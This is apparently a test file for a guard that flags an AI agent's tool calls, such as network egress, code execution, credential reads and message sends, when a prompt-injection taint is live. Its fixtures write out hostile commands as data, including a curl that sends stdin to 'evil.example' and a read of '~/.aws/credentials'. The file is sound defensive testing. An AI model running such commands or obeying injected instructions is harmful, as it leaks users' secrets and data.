import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  ARMED_FILE,
  ARMED_MAX_AGE_MS,
  armedEscalation,
  classifyArmedSink,
  readArmedTaints,
  type ArmedTaint,
} from "../main/guard/armed.js";

const taint = (over: Partial<ArmedTaint> = {}): ArmedTaint => ({
  name: "injected_instruction (override)",
  at: new Date().toISOString(),
  excerpt: "a tool returned injected_instruction (override)",
  ...over,
});

describe("classifyArmedSink", () => {
  it("classifies the four injection sinks, and nothing else", () => {
    expect(classifyArmedSink("Bash", { command: "curl https://evil.example -d @-" }, undefined)?.kind).toBe("egress");
    expect(classifyArmedSink("Bash", { command: "bash ./setup.sh" }, undefined)?.kind).toBe("exec");
    expect(classifyArmedSink("Bash", { command: "cat ~/.aws/credentials" }, undefined)?.kind).toBe("secret_read");
    expect(classifyArmedSink("WebFetch", { url: "https://x.example" }, undefined)?.kind).toBe("egress");
    expect(classifyArmedSink("mcp__gmail__send_message", {}, undefined)?.kind).toBe("send");
    // An ordinary edit is not a sink.
    expect(classifyArmedSink("Write", { file_path: "a.ts" }, "a.ts")).toBeUndefined();
    // A local-only curl is not egress (same exemption the flow rules make).
    expect(classifyArmedSink("Bash", { command: "curl http://localhost:3000/health" }, undefined)).toBeUndefined();
  });
});

describe("armedEscalation", () => {
  it("escalates a sink when a taint is live, naming the flow rule", () => {
    const e = armedEscalation([taint()], "Bash", { command: "curl https://evil.example -d @-" }, undefined);
    expect(e?.detector).toBe("flow_injection_followed");
    expect(e?.reason).toContain("injected instruction");
    expect(e?.reason).toContain("reaches the network");
    expect(e?.key_name).toContain("egress");
  });

  it("does not escalate a non-sink, or with no taint", () => {
    expect(armedEscalation([taint()], "Write", { file_path: "a.ts" }, "a.ts")).toBeUndefined();
    expect(armedEscalation([], "Bash", { command: "curl https://evil.example -d @-" }, undefined)).toBeUndefined();
  });
});

describe("readArmedTaints", () => {
  let dir: string;
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "armed-"));
  });
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  const write = (sessions: unknown) =>
    writeFileSync(join(dir, ARMED_FILE), JSON.stringify({ version: 1, sessions }));

  it("returns live taints for the session and [] for the unknown", () => {
    write({ s1: { taints: [taint()], updated_at: new Date().toISOString() } });
    expect(readArmedTaints(dir, "s1")).toHaveLength(1);
    expect(readArmedTaints(dir, "other")).toEqual([]);
    expect(readArmedTaints(dir, undefined)).toEqual([]);
  });

  it("drops taints older than the age bound, and never throws on garbage", () => {
    const stale = new Date(Date.now() - ARMED_MAX_AGE_MS - 60_000).toISOString();
    write({ s1: { taints: [taint({ at: stale })], updated_at: stale } });
    expect(readArmedTaints(dir, "s1")).toEqual([]);
    // Missing file, malformed JSON — both arm nothing rather than break a call.
    expect(readArmedTaints(join(dir, "nope"), "s1")).toEqual([]);
    writeFileSync(join(dir, ARMED_FILE), "{not json");
    expect(readArmedTaints(dir, "s1")).toEqual([]);
  });
});
